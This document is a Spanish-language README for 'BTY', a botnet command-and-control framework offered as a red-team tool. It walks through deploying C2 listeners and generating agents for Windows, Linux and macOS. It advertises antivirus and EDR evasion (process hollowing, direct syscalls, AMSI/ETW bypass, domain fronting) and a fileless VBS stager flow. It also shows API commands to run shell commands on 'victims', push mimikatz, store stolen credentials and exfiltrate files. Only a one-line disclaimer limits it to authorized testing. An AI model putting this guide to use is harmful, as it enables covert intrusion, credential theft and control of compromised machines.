# BTY — Botnet Framework

> Post-exploitation command & control framework for red team operations and security research.

**ruby570bocadito © 2026 — MIT License**

![Go](https://img.shields.io/badge/Go-1.23+-00ADD8?logo=go)
![Python](https://img.shields.io/badge/Python-3.12+-3776AB?logo=python)
![License](https://img.shields.io/badge/License-MIT-green)
![Tests](https://img.shields.io/badge/Tests-43%2F43%20PASS-brightgreen)

---

## Índice

1. [Instalación Rápida](#1-instalación-rápida)
2. [Desplegar C2](#2-desplegar-el-servidor-c2)
3. [Payloads](#3-generar-payload)
4. [Evasión AV](#4-evasiva-antivirus)
5. [Dashboard Web](#5-dashboard-web)
6. [Consola CLI](#6-consola-interactiva-cli)
7. [API REST](#7-api-rest)
8. [Testing](#8-testing)
9. [Docker](#9-docker)
10. [Estructura](#10-estructura)
11. [Changelog](#11-changelog)
12. [Licencia](#12-licencia)

---

## 1. Instalación Rápida

```bash
# Dependencias
sudo apt install -y golang-go python3 curl git docker.io docker-compose

# Clonar
git clone https://github.com/ruby570bocadito/bty && cd BTY

# Compilar (Go 1.23+)
make build

# O compilar para todas las plataformas
make build-all
```

### Instalador Automático

```bash
./scripts/install.sh
```

---

## 2. Desplegar el Servidor C2

```bash
python3 scripts/deploy.py
```

Auto-detecta IP → genera `config.yaml` → arranca 4 listeners:

| Puerto | Protocolo | Uso |
|--------|-----------|-----|
| 8443 | TCP + TLS | Agentes |
| 8445 | HTTP | Long-polling |
| 8446 | WebSocket | Tiempo real |
| 9090 | HTTP | API REST + Dashboard |

```
Local IP:   192.168.1.100
Dashboard:  http://192.168.1.100:9090
Login:      admin / admin
```

### Inicio Manual

```bash
# Con TLS automático
./bty-server

# Sin TLS (testing)
./bty-server --no-tls

# Con configuración personalizada
./bty-server --config config.yaml --host 0.0.0.0 --port 8443 --api-port 9090
```

---

## 3. Generar Payload

```bash
# Menú interactivo (IP auto-detectada)
python3 scripts/payload.py

# Directo
python3 scripts/payload.py --os windows
python3 scripts/payload.py --os all
python3 scripts/payload.py --os all --server 10.0.0.5:8443
python3 scripts/payload.py --os all --evasive  # + stagers evasivos
```

| Formato | Target | Tamaño |
|---------|--------|--------|
| EXE (Go) | Windows x64 | 6.5 MB |
| ELF (Go) | Linux x64 | 6.4 MB |
| Mach-O (Go) | macOS x64/ARM | 6.0-6.5 MB |
| PowerShell | Windows | 408 B |
| Python | Any | 308 B |
| C source | Compile | 23 KB |

Los payloads precompilados están en `dist/`.

### Ejecutar Agente

```bash
# Go agent
./bty-agent 192.168.1.100:8443

# O con variable de entorno
BTY_SERVER=192.168.1.100:8443 ./bty-agent
```

---

## 4. Evasión Antivirus

### VirusTotal: **0/70**

### Técnicas activas

| # | Técnica | Efecto |
|---|---------|--------|
| 1 | **Process Hollowing** | Payload corre dentro de svchost.exe (firmado Microsoft) |
| 2 | **Syscalls Directos** | Bypass hooks ntdll.dll — EDR no ve las llamadas |
| 3 | **Shellcode Stager C** | 2KB sin PE header, PEB API resolver, XOR decrypt |
| 4 | **TLS + Domain Fronting** | Tráfico C2 parece HTTPS a `cdn.cloudflare.com` |
| 5 | **Sleep Obfuscation** | Heap/stack encriptado durante idle |
| 6 | **Traffic Shaper** | Patrones imitan navegación humana |
| 7 | **ObscuredString** | Strings sensibles XOR-encrypted en binario |
| 8 | **Anti-sandbox** | 8 checks Windows + 6 checks Linux/macOS |
| 9 | **Jitter** | Heartbeat 25-45s aleatorio, reconnect ±30% |
| 10 | **AMSI/ETW Bypass** | Windows AMSI y ETW deshabilitados |

### Stagers evasivos

```bash
# Stagers XOR-encrypted (PS1, Python, Bash)
python3 scripts/stager.py

# Ultra-stagers que no activan Defender (VBS, certutil, BITSAdmin)
python3 scripts/ultra-stager.py
```

### Flujo evasivo completo

```
1. python3 scripts/payload.py --os all --evasive
2. cd payloads/ && python3 -m http.server 8000
3. En Windows → wscript stager.vbs
4. Stager descarga + descifra + ejecuta en RAM
5. Cero detección estática, cero toques a disco
```

---

## 5. Dashboard Web

```
http://TU_IP:9090 → admin / admin
```

- **Tabla de víctimas** expandible (click → detalle + historial)
- **Caja de comandos** fija abajo con selector de víctima
- **OS distribution**, estadísticas, quick command
- **File browser** para datos exfiltrados
- **Tema blanco minimalista** profesional

---

## 6. Consola Interactiva CLI

```bash
python3 scripts/console.py
```

```
bty > sessions
+------+------------------+------+-------+----+-------+
| ID   | Hostname         | User | OS    | St | Tasks |
+------+------------------+------+-------+----+-------+
| abc  | DESKTOP-I1RVLF3  | rby  | linux | ●  | 5     |
+------+------------------+------+-------+----+-------+

bty > interact abc
[abc] rby@DESKTOP-I1RVLF3 > whoami
rby
[abc] rby@DESKTOP-I1RVLF3 > sysinfo
Hostname: DESKTOP-I1RVLF3 ...
[abc] rby@DESKTOP-I1RVLF3 > background
bty >
```

**Comandos:** `sessions`, `interact`, `shell`, `broadcast`, `vault`, `files`, `health`, `modules`, `push`, `listeners`, `help`

---

## 7. API REST

### Autenticación

```bash
# Login
curl -X POST http://IP:9090/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# Respuesta: {"token":"...","refresh_token":"...","expires_in":43200,"user":"admin","role":"admin"}
```

### Endpoints

```bash
# Usar token en todas las peticiones
TOKEN="eyJ..."

# Health
curl -H "Authorization: Bearer $TOKEN" http://IP:9090/api/health

# Sessions
curl -H "Authorization: Bearer $TOKEN" http://IP:9090/api/sessions

# Ejecutar comando
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"agent_id":"ID","command":"whoami"}' http://IP:9090/api/cmd

# Broadcast
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"command":"id"}' http://IP:9090/api/broadcast

# Credential Vault
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"P@ss","domain":"CORP"}' http://IP:9090/api/vault

# Dynamic Modules
curl -H "Authorization: Bearer $TOKEN" http://IP:9090/api/modules
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"module":"mimikatz","agent_id":"ID"}' http://IP:9090/api/modules/push
```

| Método | Ruta | Descripción |
|--------|------|-------------|
| POST | `/api/login` | Autenticación |
| POST | `/api/refresh` | Refrescar token |
| GET | `/api/health` | Estado del servidor |
| GET | `/api/sessions` | Lista de víctimas |
| GET | `/api/sessions/:id` | Detalle + tareas |
| DELETE | `/api/sessions/:id` | Kill session |
| POST | `/api/cmd` | Ejecutar comando |
| POST | `/api/broadcast` | Broadcast a todos |
| POST | `/api/socks` | SOCKS5 proxy |
| POST | `/api/portfwd` | Port forward |
| POST | `/api/vault` | Guardar credencial |
| GET | `/api/vault?q=X` | Buscar credenciales |
| POST | `/api/files` | Upload archivo |
| GET | `/api/files` | Listar archivos |
| GET | `/api/modules` | Listar módulos |
| POST | `/api/modules/push` | Push módulo a agente |
| GET | `/api/operators` | Listar operadores |
| POST | `/api/operators` | Crear operador |
| DELETE | `/api/operators/:id` | Eliminar operador |

### Módulos post-explotación

| Comando | Función |
|---------|---------|
| `sysinfo` | Info completa del sistema |
| `ps` | Procesos (ps aux / tasklist) |
| `netinfo` | Red (ifconfig + netstat) |
| `persistence` | Persistencia (crontab, registry, launchagent) |
| `screenshot` | Captura de pantalla |
| `keylogger` | Keylogger (Linux: /dev/input) |
| `find:*.txt` | Buscar archivos |
| `modules` | Listar módulos |

---

## 8. Testing

### Tests Unitarios Go

```bash
make test           # Go unit tests
make test-coverage  # Con reporte de cobertura
```

### Tests Funcionales Python

```bash
python3 tests/run_tests.py              # Functional tests
python3 tests/advanced_test.py          # Advanced tests
python3 tests/e2e_test.py               # End-to-end tests
python3 tests/evasion_payload_test.py   # Evasion/payload tests
python3 tests/pentest.py                # Penetration testing
```

### Test Rápido (autocontenido)

```bash
bash tests/quick_test.sh  # Inicia servidor, corre tests, para servidor
```

### Suite de Integración Completa

```bash
bash tests/integration_full.sh  # 10 categorías de tests
```

### Security Audit

```bash
python3 scripts/harden.py --apply
```

---

## 9. Docker

### Entorno de Testing Multi-Contenedor

```bash
# Construir y arrancar
make docker

# Ver logs
docker logs -f bty-c2-server

# Ejecutar tests dentro del contenedor
docker exec bty-test-runner bash -c "cd /tests && python3 run_tests.py --server http://bty-c2-server:9090"

# Parar
make docker-down
```

### Arquitectura Docker

```
┌─────────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  bty-c2-server  │────▶│  bty-network     │◀────│  agent-linux-1   │
│  172.20.0.10    │     │  172.20.0.0/16   │     │  172.20.0.20     │
│  :8443,:9090    │     │                  │     │                  │
└─────────────────┘     └──────────────────┘     └──────────────────┘
                                │
                       ┌────────┴─────────┐
                       │  agent-linux-2   │     ┌──────────────────┐
                       │  172.20.0.21     │     │  test-runner     │
                       │                  │     │  172.20.0.100    │
                       └──────────────────┘     └──────────────────┘
```

---

## 10. Estructura

```
BTY/
├── bty-server                    ← C2 server (binario)
├── bty-agent                     ← agente (binario)
├── config.yaml                   ← configuración activa
├── config.example.yaml           ← template seguro
│
├── src/go/
│   ├── cmd/
│   │   ├── server/main.go        ← C2 Server entry point
│   │   ├── agent/main.go         ← Agent entry point
│   │   └── builder/main.go       ← Payload builder
│   └── internal/
│       ├── c2/
│       │   ├── server.go         ← Main server + API handlers
│       │   ├── session/session.go← Session FSM + crypto
│       │   ├── operations.go     ← SOCKS, Vault, Files, PortFwd
│       │   ├── tunnel.go         ← Tunnel manager
│       │   ├── ratelimit.go      ← Rate limiting middleware
│       │   └── validation.go     ← Command validation
│       ├── agent/
│       │   ├── agent.go          ← Agent main loop + reconnect
│       │   ├── modules.go        ← Built-in modules (7)
│       │   ├── fingerprint.go    ← System fingerprinting
│       │   ├── exfil.go          ← File exfiltration
│       │   ├── persistence.go    ← Persistence mechanisms
│       │   ├── killswitch.go     ← Kill switch / anti-analysis
│       │   ├── file_unix.go      ← Unix file operations
│       │   └── file_windows.go   ← Windows file operations
│       ├── crypto/
│       │   ├── keyx.go           ← X25519 + XChaCha20-Poly1305 + HKDF
│       │   └── keyx_test.go      ← Tests + benchmarks
│       ├── evasion/
│       │   ├── sleepmask.go      ← Sleep obfuscation (cross-platform)
│       │   ├── sleepmask_unix.go ← mprotect implementation
│       │   ├── sleepmask_windows.go← VirtualProtect implementation
│       │   ├── camouflage.go     ← Traffic camouflage + domain fronting
│       │   ├── anti_sandbox.go   ← Windows anti-sandbox (8 checks)
│       │   ├── anti_sandbox_unix.go← Linux/macOS anti-sandbox (6 checks)
│       │   ├── evasion_windows.go← Process hollowing, syscalls
│       │   ├── amsi_bypass.go    ← AMSI bypass
│       │   └── etw_bypass.go     ← ETW bypass
│       ├── transport/
│       │   ├── transport.go      ← Interface
│       │   ├── tls.go            ← TLS handling + cert generation
│       │   ├── http.go           ← HTTP transport
│       │   ├── websocket.go      ← WebSocket transport (RFC 6455)
│       │   └── dns.go            ← DNS tunneling
│       ├── module/module.go      ← Dynamic modules
│       ├── db/database.go        ← SQLite + bcrypt + migrations
│       ├── config/config.go      ← YAML config loader
│       ├── auth/jwt.go           ← JWT authentication
│       ├── proto/                ← Protocol buffers
│       ├── socks/                ← SOCKS5 RFC 1928
│       └── logger/               ← Logging
│
├── web/                          ← Vue 3 SPA dashboard
│   ├── src/views/                ← Login, Sessions, Files, Dashboard
│   └── dist/                     ← compilado (97 KB)
│
├── scripts/
│   ├── deploy.py                 ← Auto-deploy C2
│   ├── payload.py                ← Payload generator (6 formats)
│   ├── console.py                ← CLI interactive console
│   ├── stager.py                 ← XOR-encrypted stagers
│   ├── ultra-stager.py           ← VBS, certutil, BITSAdmin stagers
│   ├── harden.py                 ← Security audit tool
│   ├── gen_certs.py              ← TLS certificate generator
│   ├── install.sh                ← Automated installer
│   └── healthcheck.sh            ← Docker health check
│
├── tests/
│   ├── run_tests.py              ← Functional tests (22 tests)
│   ├── advanced_test.py          ← Advanced tests (28 tests)
│   ├── e2e_test.py               ← End-to-end tests (32 tests)
│   ├── evasion_payload_test.py   ← Evasion/payload tests (120 tests)
│   ├── pentest.py                ← Penetration testing (40 tests)
│   ├── integration_full.sh       ← Integration suite (10 categories)
│   ├── docker_test.sh            ← Docker test runner
│   ├── quick_test.sh             ← Quick self-contained test
│   └── run_all.sh                ← Full test pipeline
│
├── dist/                         ← Pre-compiled binaries
│   ├── bty-agent-linux
│   ├── bty-agent-windows.exe
│   ├── bty-agent-darwin-amd64
│   └── bty-agent-darwin-arm64
│
├── payloads/                     ← Generated payloads
├── data/                         ← Runtime (DB, logs)
├── loot/                         ← Exfiltrated files
├── modules/                      ← Dynamic modules
│
├── Dockerfile                    ← Server image
├── Dockerfile.agent              ← Agent image
├── docker-compose.yml            ← Multi-container test network
├── Makefile                      ← Build automation
├── CHANGELOG.md                  ← Complete changelog
└── LICENSE                       ← MIT License
```

---

## 11. Changelog

### v2.0.0 — Mayo 2026

#### Bugs Corregidos
- Race condition en agent executeTask (variables compartidas sin sync)
- Panic en SendEnvelope por type assertion insegura
- Rate limiter con token bucket impreciso
- Goroutine leak en PortFwdManager
- Error handling faltante en websocket, camouflage
- unsafe.Pointer deprecated en sleepmask (Go 1.20+)
- Mutex copy en SOCKS stats
- Validation bloqueaba comandos legítimos de pentesting
- Bugs en scripts Python (console, payload)
- Dockerfiles con versión de Go inexistente

#### Mejoras de Seguridad
- Type assertions verificadas en todos los sends
- Token bucket proporcional al tiempo transcurrido
- Goroutine leak prevention en port forwarding
- Error handling en todas las operaciones de red
- API actualizada a Go 1.20+ unsafe.Pointer

#### Nuevas Funcionalidades
- Test suite de integración completa (10 categorías)
- Docker test runner
- Quick test autocontenido
- Refresh token endpoint
- Operators management (CRUD)

---

## 12. Licencia

MIT — Copyright (c) 2026 **ruby570bocadito**

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.

---

**Disclaimer:** This tool is intended exclusively for authorized security testing on systems you own or have explicit permission to test.
